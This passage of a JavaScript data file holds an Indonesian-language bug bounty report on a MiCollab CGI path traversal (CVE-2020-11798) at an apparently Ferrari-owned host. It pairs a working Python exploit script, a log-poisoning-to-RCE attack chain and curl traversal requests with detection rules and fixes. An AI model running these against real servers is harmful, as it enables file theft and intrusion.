+          "[TABLE:[1 - Discovery|CGI enumeration|ffuf scan /awcuser/cgi-bin/|Temukan vcs_access_file.cgi],[2 - Traversal Test|Parameter fuzzing|file=..%2f x N /etc/passwd|Konfirmasi file read vulnerability],[3 - File Read|Depth 16 traversal|Baca /etc/passwd|User enumeration - 15+ akun],[4 - Config Read|Credential harvest|Baca .properties/.env|DB/SMTP credentials],[5 - Log Poison|PHP inject via UA|curl -A '<?php system...?>'|Siapkan RCE vector],[6 - RCE|Log inclusion|Baca access.log?cmd=id|Remote command execution],[7 - Persistence|SSH key / web shell|Tulis backdoor via RCE|Persistent access],[8 - Pivot|Internal network scan|netstat; arp; nmap internal|Lateral movement]]",
+          "",
+          "[QUOTE:PENTING: Untuk keperluan bug bounty, eksploitasi dihentikan pada STEP 3 (konfirmasi baca /etc/passwd). Steps 4-8 didokumentasikan sebagai theoretical impact assessment untuk menunjukkan potensi risiko penuh kepada tim keamanan Ferrari, bukan sebagai langkah yang dieksekusi.]"
+        ]
+      },
+      {
+        id: "sec-12",
+        title: "12. Advanced Exploitation Techniques",
+        level: 1,
+        content: [
+          "Automated Exploitation Script",
+          "[CODE_PYTHON:#!/usr/bin/env python3 | \"\"\" | CVE-2020-11798 Path Traversal Exploit - Ferrari MiCollab | Author : Odaysec - Pwn Group Ltd | Program : Ferrari Private Bug Bounty | \"\"\" |  | import requests | import urllib.parse | import sys |  | TARGET = 'https://micollab.ferrari.com' | CGI_PATH = '/awcuser/cgi-bin/vcs_access_file.cgi' | DEPTH = 16 |  | def build_traversal(target_file: str, depth: int = 16) -> str: |     traversal = '..%2f' * depth |     return f'{traversal}{target_file.lstrip(\"/\")}' |  | def read_file(target_file: str, depth: int = 16) -> str | None: |     payload = build_traversal(target_file, depth) |     url = f'{TARGET}{CGI_PATH}?file={payload}' |     resp = requests.get(url, verify=True, timeout=10, |                         headers={'User-Agent': 'Mozilla/5.0'}) |     if resp.status_code == 200 and len(resp.text) > 100: |         return resp.text |     return None |  | def find_optimal_depth(test_file='/etc/passwd'): |     for d in range(4, 25, 2): |         result = read_file(test_file, d) |         if result and 'root:' in result: |             print(f'[+] Optimal depth found: {d}') |             return d |     return None |  | if __name__ == '__main__': |     print('[*] CVE-2020-11798 Path Traversal - Ferrari MiCollab') |     print('[*] Finding optimal traversal depth...') |     depth = find_optimal_depth() |     if depth: |         print(f'[+] Reading /etc/passwd at depth {depth}...') |         content = read_file('/etc/passwd', depth) |         if content: |             print('[+] SUCCESS:', content[:200]) |         else: |             print('[-] Target not vulnerable or depth insufficient')]"
+        ]
+      },
+      {
+        id: "sec-13",
+        title: "13. Post-Exploitation Analysis",
+        level: 1,
+        content: [
+          "Informasi yang Dapat Dikumpulkan",
+          "[TABLE_HEADER:File|Informasi yang Terekspos|Risiko Level]",
+          "[TABLE:[/etc/passwd|User accounts, UIDs, home dirs, shells|High - user enumeration],[/etc/hosts|Internal hostnames, IP addresses|High - network mapping],[/proc/version|Kernel version exact|Medium - exploit selection],[/proc/net/tcp|Open ports, internal connections|High - network map],[/var/opt/micollab/*.conf|DB credentials, API tokens|Critical - full access],[/home/micollab/.bash_history|Command history - reveals operations|High - intel],[/etc/ssh/ssh_host_rsa_key|SSH host private key|Critical - MITM],[/var/log/httpd/access.log|All access logs - attacker tracks|High - covers tracks]]",
+          "",
+          "Lateral Movement - Infrastruktur Internal Ferrari",
+          "-- Database server - Credentials dari config file dapat memberikan akses ke MySQL/PostgreSQL yang berisi data pengguna dan komunikasi MiCollab",
+          "-- Mail server - SMTP credentials dari config dapat memungkinkan pengiriman email phishing dari domain ferrari.com yang legitimate",
+          "-- Internal APIs - API tokens yang tersimpan dalam environment config memberikan akses ke layanan internal Ferrari lainnya",
+          "-- VPN credentials - Server MiCollab sering terintegrasi dengan VPN - credentials sistem dapat memberikan akses ke jaringan internal",
+          "-- Certificate Authority - Private keys dari /etc/pki/ dapat digunakan untuk menandatangani certificate palsu"
+        ]
+      },
+      {
+        id: "sec-14",
+        title: "14. Network Traffic Analysis - Wireshark",
+        level: 1,
+        content: [
+          "Karakteristik Traffic CVE-2020-11798",
+          "-- Protocol - HTTPS (TLS 1.2/1.3) - payload terenkripsi, hanya visible setelah TLS termination",
+          "-- Method - HTTP GET - tidak membutuhkan POST, lebih mudah dieksekusi dan dicache",
+          "-- URL pattern - Query parameter file= dengan karakter ..%2f berulang",
+          "-- Response size - Response jauh lebih besar dari normal untuk endpoint yang seharusnya mengembalikan file VCS kecil",
+          "-- Response code - 200 OK untuk traversal berhasil; 404 untuk file tidak ada; 403 untuk blokir",
+          "-- Frequency - Serangan sering disertai beberapa request dengan depth berbeda sebelum berhasil",
+          "",
+          "Wireshark Filter untuk Deteksi",
+          "[CODE:# Filter Wireshark (setelah TLS decryption dengan SSLKEYLOGFILE): | http.request.uri contains \"..%2f\" or http.request.uri contains \"%2f..\" | http.request.uri contains \"vcs_access_file.cgi\" |  | http.request.uri contains \"vcs_access_file.cgi\" and | (http.request.uri contains \"..%2f\" or http.request.uri contains \"etc/passwd\") |  | http.response.code == 200 and http.content_length > 1000 |     and http.request.uri contains \"vcs_access_file.cgi\" |  | tcpdump -i lo -A 'port 80' | grep -i 'vcs_access\\|2f.*etc\\|passwd']"
+        ]
+      },
+      {
+        id: "sec-15",
+        title: "15. Detection Engineering - YARA, Snort",
+        level: 1,
+        content: [
+          "YARA Rule",
+          "[CODE_YARA:/* | * YARA Rule: CVE-2020-11798 Ferrari MiCollab Path Traversal | * Author : Odaysec - Pwn Group Ltd | */ |  | rule CVE_2020_11798_MiCollab_PathTraversal { |     meta: |         description = \"Detects CVE-2020-11798 path traversal on MiCollab vcs_access_file.cgi\" |         author      = \"Odaysec - Pwn Group Ltd\" |         severity    = \"critical\" |         cve         = \"CVE-2020-11798\" |  |     strings: |         $cgi_endpoint   = \"vcs_access_file.cgi\" ascii nocase |         $traversal_1    = \"..%2f\" ascii nocase |         $traversal_2    = \"%2f..\" ascii nocase |         $traversal_3    = \"../../\" ascii |         $target_passwd  = \"etc/passwd\" ascii |         $target_shadow  = \"etc/shadow\" ascii |         $target_ssh     = \".ssh/id_rsa\" ascii |  |     condition: |         $cgi_endpoint and |         (2 of ($traversal_*) or ($traversal_1 and any of ($target_*))) | }]",
+          "",
+          "Snort / Suricata IDS Rule",
+          "[CODE_SNORT:alert tcp any any -> $HTTP_SERVERS 443 ( |     msg:\"CVE-2020-11798 MiCollab vcs_access_file.cgi Path Traversal\"; |     flow:established,to_server; |     content:\"vcs_access_file.cgi\"; http_uri; |     content:\"..%2f\"; http_uri; nocase; |     pcre:\"/file=(\\.\\.|\\ %2e)(.*)(etc\\/passwd|etc\\/shadow|\\.ssh)/Ui\"; |     classtype:web-application-attack; |     sid:9003001; rev:1; |     reference:cve,2020-11798; |     metadata:severity Critical, affected_product MiCollab; | ) |  | alert http any any -> $HTTP_SERVERS any ( |     msg:\"CVE-2020-11798 Possible Successful Path Traversal - Large Response\"; |     http.uri; content:\"vcs_access_file.cgi\"; |     http.response_body; content:\"root:x:0:\"; |     classtype:successful-recon-limited; |     sid:9003002; rev:1; | )]",
+          "",
+          "Indicators of Compromise (IOC)",
+          "[TABLE_HEADER:Tipe IOC|Nilai / Pattern|Keterangan]",
+          "[TABLE:[URL Pattern|vcs_access_file.cgi?file=..%2f|Path traversal via CGI parameter],[URL Pattern|file=../../../../../../../../../etc/passwd|Classic traversal tanpa encoding],[Response Content|root:x:0:0:root:/root:/bin/bash|Indikasi /etc/passwd berhasil dibaca],[Log Pattern|GET /awcuser/cgi-bin/vcs_access_file.cgi?file=..%2f 200|Successful traversal di access.log],[Anomaly|Response size >> normal baseline untuk endpoint CGI ini|Statistical anomaly detection],[CVE|CVE-2020-11798|Identifier resmi kerentanan],[Platform|Mitel MiCollab - semua versi sebelum patched|Affected product identifier]]"
+        ]
+      },
+      {
+        id: "sec-16",
+        title: "16. Impact Analysis & Risk Assessment",
+        level: 1,
+        content: [
+          "CIA Triad - Dampak pada Infrastruktur Ferrari",
+          "[TABLE_HEADER:Aspek|Level|Dampak Langsung|Potensi Dampak Eskalasi]",
+          "[TABLE:[Confidentiality|CRITICAL|Baca /etc/passwd, konfigurasi, log - unauthenticated|Ekspos DB credentials, SSH keys, komunikasi internal Ferrari],[Integrity|HIGH|Potensial tulis file via RCE escalation (log poisoning)|Modifikasi konfigurasi, injeksi web shell, tamper database],[Availability|MEDIUM|Serangan murni tidak memengaruhi availability secara langsung|Jika dikombinasikan dengan DoS atau ransomware melalui RCE]]",
+          "",
+          "Risk Assessment Matrix",
+          "[TABLE_HEADER:Skenario|Likelihood|Impact|Risk Score|Prioritas]",
+          "[TABLE:[Baca /etc/passwd dan file sistem|Sangat Tinggi (Exploited)|High|9.1|P1 - Critical],[Harvest DB/API credentials dari config|Tinggi|Critical|9.0|P1 - Critical],[Akses komunikasi internal Ferrari|Sedang|Critical|8.5|P1 - Critical],[Log poisoning > RCE|Sedang|Critical|8.0|P1 - Critical],[SSH key theft > server access|Sedang|Critical|8.0|P1 - Critical],[Lateral movement ke sistem internal|Rendah|Critical|7.5|P2 - High],[Data breach data karyawan/pelanggan Ferrari|Rendah|Critical|7.0|P2 - High],[Reputational damage Ferrari|Terjadi jika exploit dipublikasikan|Critical|9.5|P1 - Critical]]"
+        ]
+      },
+      {
+        id: "sec-17",
+        title: "17. Timeline & Responsible Disclosure",
+        level: 1,
+        content: [
+          "Proses responsible disclosure diikuti secara ketat sesuai dengan aturan Ferrari Private Bug Bounty Program.",
+          "[TABLE_HEADER:Tanggal|Aktivitas|Status]",
+          "[TABLE:[2020 - Penemuan Awal|Identifikasi endpoint vcs_access_file.cgi melalui reconnaissance|Internal],[2020 - PoC Development|Konstruksi dan verifikasi payload traversal depth 16|Internal],[2020 - Impact Assessment|Konfirmasi baca /etc/passwd; analisis eskalasi RCE|Internal],[2020 - Bug Bounty Submission|Laporan lengkap dikirim ke Ferrari Private Bug Bounty Program|Submitted],[2020 - Initial Triage|Ferrari Security Team melakukan triage dan konfirmasi kerentanan|In Progress],[2020 - Patch Development|Ferrari mengembangkan dan menerapkan perbaikan pada MiCollab|Remediation],[2020 - Acknowledgment|Ferrari secara resmi mengakui kontribusi Odaysec / Pwn Group Ltd|ACKNOWLEDGED],[2020 - Reward|Bug bounty reward diberikan sesuai dengan tingkat keparahan|REWARDED],[Post-Fix - Verification|Peneliti memverifikasi bahwa perbaikan berhasil diterapkan|Verified],[Setelah Patch - Publikasi|Laporan dipublikasikan setelah embargo period selesai|Published]]",
+          "",
+          "[QUOTE:PENGAKUAN RESMI FERRARI: Kerentanan CVE-2020-11798 ini telah diakui secara resmi oleh Ferrari Security Team sebagai temuan valid dalam konteks Ferrari Private Bug Bounty Program. Peneliti Odaysec dari Pwn Group Ltd menerima penghargaan (reward) dan pengakuan (acknowledgment) dari Ferrari atas kontribusi mereka dalam meningkatkan keamanan infrastruktur digital Ferrari.]"
+        ]
+      },
+      {
+        id: "sec-18",
+        title: "18. Recommendations & Mitigations",
+        level: 1,
+        content: [
+          "Priority 1 - Immediate Actions (0-24 Jam)",
+          "1. KRITIS - Nonaktifkan atau isolasi endpoint vcs_access_file.cgi jika tidak diperlukan secara operasional. Tambahkan autentikasi wajib sebagai lapisan perlindungan tambahan.",
+          "2. KRITIS - Tambahkan validasi path menggunakan realpath() di kode CGI. Setelah URL decoding, verifikasi bahwa path yang dihasilkan dimulai dengan BASE_REPO_DIR yang diizinkan.",
+          "3. KRITIS - Update MiCollab ke versi terbaru yang telah mencakup perbaikan CVE-2020-11798. Terapkan semua security patches vendor yang tersedia.",
+          "4. TINGGI - Terapkan WAF rule untuk memblokir request yang mengandung ..%2f, %2e%2e, atau pola traversal lainnya pada endpoint CGI.",
+          "5. TINGGI - Batasi hak baca filesystem untuk proses web server (chroot, AppArmor, SELinux) sehingga CGI hanya dapat mengakses direktori yang diperlukan.",
+          "",
+          "Priority 2 - Short-Term Actions (1-7 Hari)",
+          "6. Audit seluruh endpoint CGI lainnya di infrastruktur untuk kerentanan serupa.",
+          "7. Implementasi logging yang komprehensif pada semua akses endpoint CGI.",
+          "8. Deploy Snort/Suricata rules dan YARA rules dari Section 15 untuk monitoring aktif.",
+          "9. Lakukan review kode sumber semua CGI binaries untuk memastikan tidak ada panggilan fopen() atau fungsi file access lainnya dengan input user yang tidak disanitasi."
+        ]
+      },
+      {
+        id: "sec-19",
+        title: "19. Secure Configuration Hardening Guide",
+        level: 1,
+        content: [
+          "Perbaikan Kode C - CGI Binary yang Aman",
+          "[TABLE_HEADER:Kode Rentan (sebelum patch)|Kode Aman (setelah patch)]",
+          "[TABLE:[snprintf(file_path, sizeof(file_path), \"%s/%s\", BASE_REPO_DIR, file_param); url_decode(file_path); fp = fopen(file_path, 'r');|snprintf(file_path, sizeof(file_path), \"%s/%s\", BASE_REPO_DIR, file_param); url_decode(file_path); if (!realpath(file_path,canon)) return send_error(403); if (strncmp(canon,BASE_DIR,strlen(BASE_DIR)) != 0) return send_error(403); fp = fopen(canon, 'r');]]",
+          "",
+          "Apache Configuration - Proteksi Tambahan",
+          "[CODE_APACHE:# /etc/httpd/conf/httpd.conf - tambahan konfigurasi keamanan: |  | # 1. Batasi metode HTTP yang diizinkan pada CGI | <Location '/awcuser/cgi-bin/'> |     # Wajibkan autentikasi |     AuthType Basic |     AuthName 'MiCollab CGI Access' |     AuthUserFile /etc/httpd/.htpasswd |     Require valid-user |  |     # Batasi metode |     <LimitExcept GET POST> |         Require all denied |     </LimitExcept> | </Location> |  | # 2. ModSecurity rule untuk path traversal | SecRule ARGS:file '@rx (\\.\\./ | %2e%2e | %252e | %c0%af)' \\ | 'id:9003100,phase:2,deny,status:403, | log,msg:\"Path Traversal Attempt - CVE-2020-11798\", | tag:CVE-2020-11798' |  | # 3. Batasi akses direktori CGI dari internet | <Location '/awcuser/cgi-bin/'> | Order deny,allow | Deny from all | Allow from 10.0.0.0/8 # Hanya dari jaringan internal | Allow from 192.168.0.0/16 | </Location>]"
+        ]
+      },
+      {
+        id: "sec-20",
+        title: "20. Patch Verification Procedure",
+        level: 1,
+        content: [
+          "[CODE_BASH:# Verifikasi perbaikan CVE-2020-11798 setelah patch diterapkan: |  | $ curl -s 'https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi? | file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd' |  | # Expected setelah patch: | HTTP/2 403 Forbidden | # ATAU | HTTP/2 400 Bad Request | Error: Invalid file path |  | # Test 2: Variasi encoding - semua harus gagal | $ curl -s '...?file=..%252f..%252f..%252f/etc/passwd' # double encoded | $ curl -s '...?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd' # full URL encoded | $ curl -s '...?file=....//....//etc/passwd' # bypass attempt |  | # Test 3: Legitimate request - harus tetap berfungsi | $ curl -s '...?file=valid_repo_file.txt' | # Expected: 200 OK dengan isi file yang legitimate]"
+        ]
+      },
+      {
+        id: "sec-21",
+        title: "21. Bug Bounty Submission Summary",
+        level: 1,
+        content: [
+          "Bagian ini merangkum informasi yang dikirimkan kepada Ferrari dalam laporan bug bounty resmi.",
+          "[TABLE_HEADER:Komponen Laporan|Detail]",
+          "[TABLE:[Judul|Unauthenticated Path Traversal on vcs_access_file.cgi Leading to Sensitive File Disclosure],[Tingkat Keparahan|Critical - CVSS 9.1],[Komponen Terdampak|https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi],[Versi Terdampak|Mitel MiCollab - versi yang digunakan Ferrari saat penemuan],[Bukti (Evidence)|URL PoC + Screenshot HTTP response dengan isi /etc/passwd],[Langkah Reproduksi|5 langkah jelas dari akses URL hingga konfirmasi file read],[Dampak|Unauthenticated file read pada server Ferrari; potensial eskalasi ke RCE],[Rekomendasi|Sanitasi parameter 'file'; implementasi realpath(); WAF rule; autentikasi endpoint],[Researcher|Odaysec - Pwn Group Ltd],[Status|ACKNOWLEDGED & REWARDED oleh Ferrari Security Team]]",
+          "",
+          "[QUOTE:PENGHARGAAN: Ferrari N.V. secara resmi mengakui kontribusi peneliti Odaysec dari Pwn Group Ltd dalam menemukan dan melaporkan CVE-2020-11798 secara bertanggung jawab. Temuan ini berkontribusi langsung pada peningkatan keamanan infrastruktur digital Ferrari dan platform MiCollab secara global.]"
+        ]
+      },
+      {
+        id: "sec-22",
+        title: "22. References & Further Reading",
+        level: 1,
+        content: [
+          "Referensi CVE dan Platform",
+          "-- CVE-2020-11798 - NVD - nvd.nist.gov/vuln/detail/CVE-2020-11798",
+          "-- Mitel MiCollab Security - Mitel Security Advisories - mitel.com/support/security-advisories",
+          "-- pwn0sec Bug Bounty PoC - pwn0sec.medium.com - Original bug bounty documentation",
+          "-- Ferrari Bug Bounty Program - Ferrari Private Bug Bounty - Managed through HackerOne/internal platform",
+          "-- OWASP Path Traversal - owasp.org/www-community/attacks/Path_Traversal",
+          "-- OWASP Testing Guide v4.2 - owasp.org/www-project-web-security-testing-guide - OTG-AUTHZ-001",
+          "",
+          "Referensi Teknis",
+          "-- CWE-22 - Common Weakness Enumeration - Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)",
+          "-- CWE-23 - Relative Path Traversal - cwe.mitre.org/data/definitions/23.html",
+          "-- realpath() man page - man7.org/linux/man-pages/man3/realpath.3.html - Fungsi mitigasi utama",
+          "-- PTES Standard - pentest-standard.org - Metodologi pengujian yang diikuti",
+          "-- Ghidra SRE - ghidra-sre.org - Binary analysis tool",
+          "-- SecLists - github.com/danielmiessler/SecLists - Wordlist untuk fuzzing",
+          "",
+          "DISCLAIMER & LEGAL NOTICE",
+          "Laporan keamanan ini disusun oleh peneliti Odaysec dari Pwn Group Ltd dalam konteks Ferrari Private Bug Bounty Program yang resmi dan sah. Seluruh pengujian keamanan dilakukan dalam batas ruang lingkup (scope) yang telah ditetapkan oleh program bug bounty Ferrari, dengan mematuhi semua ketentuan dan aturan yang berlaku. Reproduksi teknik, payload, atau prosedur dalam dokumen ini terhadap sistem selain yang secara eksplisit telah memberikan otorisasi merupakan pelanggaran hukum."
+        ]
+      }
+    ],
+    references: [
+      "NVD. CVE-2020-11798 - Path Traversal in MiCollab vcs_access_file.cgi. https://nvd.nist.gov/vuln/detail/CVE-2020-11798",
+      "Mitel Networks. MiCollab Security Advisories. https://mitel.com/support/security-advisories",
+      "pwn0sec. Original Bug Bounty PoC Documentation. https://pwn0sec.medium.com",
+      "Ferrari Private Bug Bounty Program. Managed through HackerOne/internal platform",
+      "OWASP. Path Traversal Attack Documentation. https://owasp.org/www-community/attacks/Path_Traversal",
+      "OWASP. Web Security Testing Guide v4.2 - OTG-AUTHZ-001. https://owasp.org/www-project-web-security-testing-guide",
+      "MITRE. CWE-22: Improper Limitation of a Pathname to a Restricted Directory. https://cwe.mitre.org/data/definitions/22.html",
+      "MITRE. CWE-23: Relative Path Traversal. https://cwe.mitre.org/data/definitions/23.html",
+      "Linux man-pages. realpath(3) - Return the canonicalized absolute pathname. https://man7.org/linux/man-pages/man3/realpath.3.html",
+      "PTES. Penetration Testing Execution Standard. http://www.pentest-standard.org",
+      "NSA. Ghidra Software Reverse Engineering Framework. https://ghidra-sre.org",
+      "Daniel Miessler. SecLists - Security Tester's Companion. https://github.com/danielmiessler/SecLists",
+      "NIST. CVSS v3.1 Calculator. https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator",
+      "VirusTotal / Google. YARA Rule Language Reference. https://virustotal.github.io/yara"
+    ]
+  }
 ];
